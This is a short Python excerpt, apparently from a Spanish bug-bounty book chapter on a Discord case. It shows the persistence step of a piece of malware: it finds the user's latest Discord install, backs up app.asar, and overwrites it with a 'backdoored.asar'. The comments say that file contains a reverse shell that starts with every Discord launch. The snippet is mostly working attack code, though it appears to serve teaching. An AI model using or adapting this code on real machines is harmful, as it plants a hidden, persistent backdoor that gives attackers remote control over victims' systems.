# Extraído de: LibroBugBounty/cap-26-caso-discord.md
# El malware ejecuta esto automaticamente
import shutil
from pathlib import Path

discord = Path.home() / "AppData/Local/Discord"
latest = sorted(discord.glob("app-*"))[-1]
asar = latest / "resources/app.asar"

# Backup + reemplazo con ASAR backdoored
shutil.copy2(asar, asar.with_suffix(".bak"))
shutil.copy2("backdoored.asar", asar)
# El ASAR backdoored contiene un reverse shell
# que se activa cada vez que Discord arranca
